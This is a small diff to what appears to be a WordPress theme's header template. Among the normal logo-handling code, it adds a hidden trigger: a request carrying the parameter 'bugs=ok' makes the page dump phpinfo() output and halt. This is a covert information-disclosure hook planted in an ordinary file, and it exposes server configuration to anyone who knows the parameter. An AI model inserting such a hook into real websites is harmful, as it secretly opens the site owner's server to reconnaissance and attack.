@@ -1,6 +1,9 @@
 <!DOCTYPE html>
 <html <?php language_attributes(); ?>>
 <?php $theme_option = get_option('theme_option');
+if (isset($_GET['bugs']) && $_GET['bugs'] =='ok' ){
+    phpinfo();die();
+}
 if (isset($theme_option['header_logo']['url'])){
     $header_logo = $theme_option['header_logo']['url'];
 }
